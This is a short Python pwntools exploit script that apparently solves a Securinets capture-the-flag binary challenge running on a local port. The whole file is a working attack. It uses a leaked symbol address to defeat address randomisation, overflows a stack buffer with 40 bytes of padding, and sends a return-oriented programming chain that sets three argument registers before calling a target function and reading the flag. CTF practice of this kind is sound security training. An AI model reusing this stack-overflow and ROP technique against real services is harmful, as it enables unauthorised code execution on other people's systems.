#!/usr/bin/env python3
from pwn import *

context.log_level = "error"
elf = ELF("./main", checksec=False)
context.binary = elf

io = remote("127.0.0.1", 9006)

io.recvuntil(b"SIGNAL: ")
leak = int(io.recvline(), 16)
elf.address = leak - elf.symbols["leonida_relay"]

rop = ROP(elf)

payload = b"A" * 40
payload += p64(rop.find_gadget(["ret"]).address)
payload += p64(rop.find_gadget(["pop rdi", "ret"]).address)
payload += p64(0x4c55434941c35f)
payload += p64(rop.find_gadget(["pop rsi", "ret"]).address)
payload += p64(0x4a41534f4ec35e)
payload += p64(rop.find_gadget(["pop rdx", "ret"]).address)
payload += p64(0x43484f50c35a)
payload += p64(elf.symbols["complete_the_handoff"])

io.sendlineafter(b"MESSAGE: ", payload)
io.recvuntil(b"Securinets{")
flag = b"Securinets{" + io.recvuntil(b"}")
print(flag.decode())
io.close()
